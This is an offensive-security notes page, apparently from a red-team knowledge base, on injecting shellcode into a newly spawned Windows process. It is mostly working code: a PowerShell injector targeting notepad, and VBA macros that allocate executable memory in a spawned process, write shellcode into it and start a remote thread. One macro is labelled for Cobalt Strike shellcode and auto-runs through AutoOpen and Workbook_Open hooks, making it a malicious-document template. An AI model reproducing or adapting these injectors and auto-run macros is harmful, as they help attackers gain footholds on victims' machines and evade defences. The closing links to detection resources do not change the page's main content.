# Inject Spawned Process

## CreateProcess

> [!INFO]
> The maximum length for `lpCommandLine` parameter is 32,767 characters in total.
> > [!TIP]
> > When you want to spawn a process then inject the payload. Implement conditions to discover uncommon programs that are installed in the computer.

### C

```c
#include <windows.h>
#include <processthreadsapi.h>

#pragma comment(lib, "kernel32.lib")

CreateProcess()

DWORD PID = pInfo.dwProcessId;
```

```
CreateProcessA()
CreateProcessW()
```

```
$ x86_64-w64-mingw32-gcc -l kernel32 -o payload.exe payload.c
```

## PowerShell

```powershell
# Start a notepad process. This will be our injection target
$NotepadProcess = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'notepad.exe' }
 
# Compile and load Windows API functions that will be needed to inject into another process
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
 
namespace Win32 {
	public class NativeMethods {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("ntdll.dll")] public static extern int RtlCreateUserThread(IntPtr ProcessHandle, IntPtr SecurityDescriptor, bool CreateSuspended, IntPtr StackZeroBits, IntPtr StackReserved, IntPtr StackCommit, IntPtr StartAddress, IntPtr StartParameter, ref IntPtr ThreadHandle, ref IntPtr ClientID);
	}
}
'@
 
# Benign shellcode to inject into notepad - 0x90 (NOP), 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
[Byte[]] $Code = @(0x90, 0x90, 0x90, 0xC3)
 
# Obtain a handle to the open notepad process
$TargetProcessHandle = [Win32.NativeMethods]::OpenProcess(0x001FFFFF, $False, $NotepadProcess.ProcessId)
 
# Allocate read/write/execute memory in the notepad process for the shellcode
$TargetProcessBaseAddress = [Win32.NativeMethods]::VirtualAllocEx($TargetProcessHandle, [IntPtr]::Zero, $Code.Length, 0x3000, 0x40)
 
# Write the shellcode buffer to the notepad processâ€‹
$BytesWritten = 0
$null = [Win32.NativeMethods]::WriteProcessMemory($TargetProcessHandle, $TargetProcessBaseAddress, $Code, $Code.Length, [Ref] $BytesWritten)
 
# Execute the shellcode in the notepad process
[IntPtr] $RemoteThreadHandle = [IntPtr]::Zero
[IntPtr] $CliendId = [IntPtr]::Zero
$null = [Win32.NativeMethods]::RtlCreateUserThread($TargetProcessHandle, [IntPtr]::Zero, $False, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $TargetProcessBaseAddress, [IntPtr]::Zero, [Ref] $RemoteThreadHandle, [Ref] $CliendId)
 
# Cleanup
$null = [Win32.NativeMethods]::CloseHandle($RemoteThreadHandle)
$null = [Win32.NativeMethods]::CloseHandle($TargetProcessHandle)
Stop-Process -Id $NotepadProcess.ProcessId 
```

## VBA

Includes negative decimal base 10 values will be executed as an absolute value.

```vb
#If VBA7 Then
    Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr

    Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

    Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr

    Private Declare PtrSafe Function CreateProcessA Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateRemoteThread Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function VirtualAllocEx Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteProcessMemory Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function CreateProcessA Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Sub Execute()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If
    ' Cobalt Strike shellcode
    myArray = Array()
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If
    res = CreateProcessA(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = VirtualAllocEx(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteProcessMemory(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateRemoteThread(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub

Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub
```

```vb
Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As String, ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, _
    ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As LongPtr, _
    lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long

Private Declare PtrSafe Function OpenProcess Lib "kernel32" ( _
    ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, _
    ByVal dwProcessId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" ( _
    ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" ( _
    ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, _
    lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As LongPtr) As Long

Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" ( _
    ByVal hProcess As LongPtr, ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, _
    lpThreadId As LongPtr) As LongPtr

Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal uFlags As Long, ByVal dwBytes As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByVal Source As Byte, ByVal Length As Long) As LongPtr

Type STARTUPINFO
    cb As Long
    lpReserved As LongPtr
    lpDesktop As LongPtr
    lpTitle As LongPtr
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessID As Long
    dwThreadID As Long
End Type

Sub main()
    Const STARTF_USESHOWWINDOW = &H1
    Const SW_SHOW = 5
    Const SW_HIDE = 0
    Const PROCESS_ALL_ACCESS = &H1F0FFF
    Const MEM_COMMIT = &H1000
    Const MEM_RESERVE = &H2000
    Const MEM_RESET = &H8000
    Const PAGE_EXECUTE_READWRITE = &H40
    Const GMEM_FIXED = &H0

    Dim proc As PROCESS_INFORMATION
    Dim PID As Long
    Dim shellcode As Variant
    shellcode = Array(&H90) ' NOP instruction

    Dim start As STARTUPINFO
    Dim ReturnValue As LongPtr
    Dim ret As Long
    Dim hThreadID As Long
    Dim windowsDir As String

    start.cb = Len(start)
    start.dwFlags = STARTF_USESHOWWINDOW
    start.wShowWindow = SW_HIDE ' Hide process window

    ' Handle 64-bit system paths
    #If Win64 Then
        Dim FSO As Object
        Set FSO = CreateObject("Scripting.FileSystemObject")
        windowsDir = FSO.GetSpecialFolder(0) & "\SysWOW64\notepad.exe"
    #Else
        windowsDir = "notepad.exe"
    #End If

    ' Create Notepad process
    ReturnValue = CreateProcessA(0, windowsDir, 0, 0, False, 0, 0, 0, start, proc)

    ' Open the target process
    Dim hTargetProcHandle As LongPtr
    PID = proc.dwProcessID
    hTargetProcHandle = OpenProcess(PROCESS_ALL_ACCESS, False, PID)

    ' Allocate memory in the target process
    Dim DwCodeLen As Long
    Dim MemoryAddress As LongPtr
    DwCodeLen = &H800
    MemoryAddress = VirtualAllocEx(hTargetProcHandle, 0, DwCodeLen, MEM_COMMIT Or MEM_RESERVE Or MEM_RESET, PAGE_EXECUTE_READWRITE)

    ' Allocate global memory for shellcode
    Dim hGlobalMemory As LongPtr
    hGlobalMemory = GlobalAlloc(GMEM_FIXED, UBound(shellcode) + 1)

    ' Write shellcode into allocated memory
    Dim i As Long
    Dim bValue As Byte
    Dim rRtlReturn As LongPtr
    For i = LBound(shellcode) To UBound(shellcode)
        bValue = shellcode(i)
        rRtlReturn = RtlMoveMemory(hGlobalMemory + i, bValue, 1)
    Next i

    ' Write shellcode into remote process memory
    Dim resultWriteProcess As Long
    resultWriteProcess = WriteProcessMemory(hTargetProcHandle, MemoryAddress, hGlobalMemory, UBound(shellcode) + 1, ret)

    ' Execute the shellcode using CreateRemoteThread
    Dim hThread As LongPtr
    hThread = CreateRemoteThread(hTargetProcHandle, 0, 0, MemoryAddress, 0, 0, 0)

    ' Close process handle
    CloseHandle hThread
    CloseHandle hTargetProcHandle
End Sub
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/Malware Development/Payload Execution/Process Injection/Windows/Inject Existing Process]]

### Tenouk

- [Tenouk: Processes and Threads - C Run-Time - Part 1](https://www.tenouk.com/ModuleR.html)

- [Tenouk: Processes and Threads - C Run-Time - Part 2](https://www.tenouk.com/ModuleR1.html)

- [Tenouk: Processes and Threads - C Run-Time - Part 3](https://www.tenouk.com/ModuleR2.html)

- [Tenouk: Processes and Threads - WinAPIs - Part 6](https://www.tenouk.com/ModuleU.html)

- [Tenouk: Processes and Threads - WinAPIs - Part 8](https://www.tenouk.com/ModuleU2.html)

- [Tenouk: Processes and Threads - WinAPIs - Part 9](https://www.tenouk.com/ModuleU3.html)

- [Tenouk: Processes and Threads - WinAPIs - Part 10](https://www.tenouk.com/ModuleU4.html)

- [Tenouk: Windows Process and Thread References 2](https://www.tenouk.com/crstufunction1.html)

- [Tenouk: Windows Services & Process - A Supplementary Note](https://www.tenouk.com/cddeefunction1.html)

### Github

- [Chvancooten: Process Hollowing](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Hollowing)

### Red Canary

- [Red Canary: Process Injection](https://redcanary.com/threat-detection-report/techniques/process-injection/)